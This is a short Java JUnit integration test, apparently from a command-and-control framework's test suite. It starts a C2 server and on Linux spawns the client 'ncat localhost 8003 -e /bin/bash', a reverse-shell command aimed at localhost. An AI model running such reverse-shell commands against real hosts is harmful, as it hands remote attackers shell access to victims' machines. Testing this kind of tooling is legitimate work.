package c2.nativeshell;

import java.io.IOException;

import org.junit.jupiter.api.Test;

import util.test.ClientServerTest;
import util.test.RunnerTestGeneric;
import util.test.TestConfiguration;
import util.test.TestConfiguration.OS;
import util.test.TestConstants;

class NcatIntegrationTest extends ClientServerTest {

	@Test
	void test() {
		TestConfiguration.OS thisOS = TestConfiguration.getThisSystemOS();
		if (thisOS == OS.MAC) {
			System.out.println("Native clients not yet supported on Mac");
		} else {
			try {
				Runtime.getRuntime().exec("ncat");
			} catch (IOException e) {
				System.out.println("ncat not available on this host, skipping ncat integration test sequence");
				return;
			}
			if (thisOS == OS.WINDOWS) {
				initiateServer();
				spawnClient(TestConstants.WINDOWSNATIVE_TEST_EXE);
			} else {
				initiateServer("test_linux.properties");
				spawnClient("ncat localhost 8003 -e /bin/bash");
			}
			RunnerTestGeneric.test(new TestConfiguration(thisOS, "Native", "TCP"));
			awaitClient();
			teardown();
		}
	}

}
